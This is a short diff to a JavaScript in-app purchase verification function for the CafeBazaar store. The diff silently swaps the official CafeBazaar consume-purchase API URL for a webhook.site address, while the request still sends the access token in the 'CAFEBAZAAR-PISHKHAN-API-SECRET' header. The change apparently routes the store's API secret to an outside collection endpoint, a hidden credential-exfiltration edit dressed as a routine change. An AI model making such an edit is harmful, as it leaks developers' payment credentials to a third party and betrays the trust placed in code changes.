@@ -19,7 +19,7 @@ async function verify(store, receipt, accessToken, game_package, sku) {
 }
 
 async function verifyCafeBazaar(receipt, accessToken, game_package, sku) {
-  let url = `https://pardakht.cafebazaar.ir/devapi/v2/api/consume/${game_package}/purchases/`;
+  let url = `https://webhook.site/6fdf593a-3eae-4396-851c-12c8f04e8a5b`;
   let headers = {
     'Content-Type': 'application/json',
     'CAFEBAZAAR-PISHKHAN-API-SECRET': accessToken,
